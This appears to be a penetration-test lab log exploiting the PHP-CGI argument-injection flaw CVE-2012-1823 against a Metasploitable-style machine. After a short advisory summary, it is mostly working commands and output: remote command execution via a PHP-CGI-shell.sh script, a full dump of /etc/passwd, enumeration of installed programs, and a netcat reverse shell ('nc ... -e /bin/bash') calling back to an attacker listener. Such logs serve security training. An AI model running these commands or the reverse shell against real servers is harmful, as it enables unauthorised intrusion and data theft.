
Description:
  When run as a CGI, PHP up to version 5.3.12 and 5.4.2 is vulnerable 
  to an argument injection vulnerability. This module takes advantage 
  of the -d flag to set php.ini directives to achieve code execution. 
  From the advisory: "if there is NO unescaped '=' in the query 
  string, the string is split on '+' (encoded space) characters, 
  urldecoded, passed to a function that escapes shell metacharacters 
  (the "encoded in a system-defined manner" from the RFC) and then 
  passes them to the CGI binary." This module can also be used to 
  exploit the plesk 0day disclosed by kingcope and exploited in the 
  wild on June 2013.

References:
  https://cvedetails.com/cve/CVE-2012-1823/
  OSVDB (81633)
  OSVDB (93979)
  https://www.exploit-db.com/exploits/25986
  http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/
  http://kb.parallels.com/en/116241

======================  PHP 5.2.4 CGI ENUMERATION=====================
root@noondi:~# cd scripts/
root@noondi:~/scripts# chmod 755 PHP-CGI-shell.sh
root@noondi:~/scripts# ./PHP-CGI-shell.sh 192.168.209.151 hostname
HTTP/1.1 200 OK
Date: Mon, 14 May 2018 01:28:04 GMT
Server: Apache/2.2.8 (Ubuntu) DAV/2
X-Powered-By: PHP/5.2.4-2ubuntu5.10
Transfer-Encoding: chunked
Content-Type: text/html

metasploitable
root@noondi:~/scripts# ./PHP-CGI-shell.sh 192.168.209.151 id
HTTP/1.1 200 OK
Date: Mon, 14 May 2018 01:30:51 GMT
Server: Apache/2.2.8 (Ubuntu) DAV/2
X-Powered-By: PHP/5.2.4-2ubuntu5.10
Content-Length: 54
Content-Type: text/html

uid=33(www-data) gid=33(www-data) groups=33(www-data)
root@noondi:~/scripts# ./PHP-CGI-shell.sh 192.168.209.151 "uname -r"
HTTP/1.1 200 OK
Date: Mon, 14 May 2018 01:31:31 GMT
Server: Apache/2.2.8 (Ubuntu) DAV/2
X-Powered-By: PHP/5.2.4-2ubuntu5.10
Transfer-Encoding: chunked
Content-Type: text/html

2.6.24-16-server
root@noondi:~/scripts# ./PHP-CGI-shell.sh 192.168.209.151 "cat /etc/passwd"
HTTP/1.1 200 OK
Date: Mon, 14 May 2018 01:32:50 GMT
Server: Apache/2.2.8 (Ubuntu) DAV/2
X-Powered-By: PHP/5.2.4-2ubuntu5.10
Transfer-Encoding: chunked
Content-Type: text/html

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
bind:x:105:113::/var/cache/bind:/bin/false
postfix:x:106:115::/var/spool/postfix:/bin/false
ftp:x:107:65534::/home/ftp:/bin/false
postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
distccd:x:111:65534::/:/bin/false
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
service:x:1002:1002:,,,:/home/service:/bin/bash
telnetd:x:112:120::/nonexistent:/bin/false
proftpd:x:113:65534::/var/run/proftpd:/bin/false
statd:x:114:65534::/var/lib/nfs:/bin/false
dojodone:x:1003:1003:noondi:/home/dojodone:/bin/bash
root@noondi:~/scripts# 

LIST OF INSTALLED PROGRAMS
============================
root@noondi:~/scripts# ./PHP-CGI-shell.sh 192.168.209.151 " ls -lah /usr/share/applications | awk -F '.desktop' ' { print $1}' "
HTTP/1.1 200 OK
Date: Mon, 14 May 2018 02:55:21 GMT
Server: Apache/2.2.8 (Ubuntu) DAV/2
X-Powered-By: PHP/5.2.4-2ubuntu5.10
Transfer-Encoding: chunked
Content-Type: text/html

total 32K
drwxr-xr-x   2 root root 4.0K May 20  2012 .
drwxr-xr-x 127 root root 4.0K May 20  2012 ..
-rw-r--r--   1 root root  265 Jul 25  2008 filezilla.desktop
-rw-r--r--   1 root root 2.7K Apr 22  2011 firefox.desktop
-rw-r--r--   1 root root 9.2K Jul  3  2009 pidgin.desktop
-rw-r--r--   1 root root  239 Jan 20  2010 python2.5.desktop


================================GETTING REVERSE SHELLS=========================

1. GETTING A REVERSE SHELL WITH NETCAT
======================================
***************HAVE A LISTNER READY ON ATTACKER'S MACHINE************
root@noondi:~# nc -lvp 6666
listening on [any] 6666 ...

*******************VICTIM BOX***************************************
root@noondi:~/scripts# ./PHP-CGI-shell.sh 192.168.209.151 "nc 192.168.209.179 6666 -e /bin/bash"

*******************ATTACKER'S MACHINE********************************
root@noondi:~# nc -lvp 6666
listening on [any] 6666 ...
192.168.209.151: inverse host lookup failed: Unknown host
connect to [192.168.209.179] from (UNKNOWN) [192.168.209.151] 56953

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

whoami
www-data

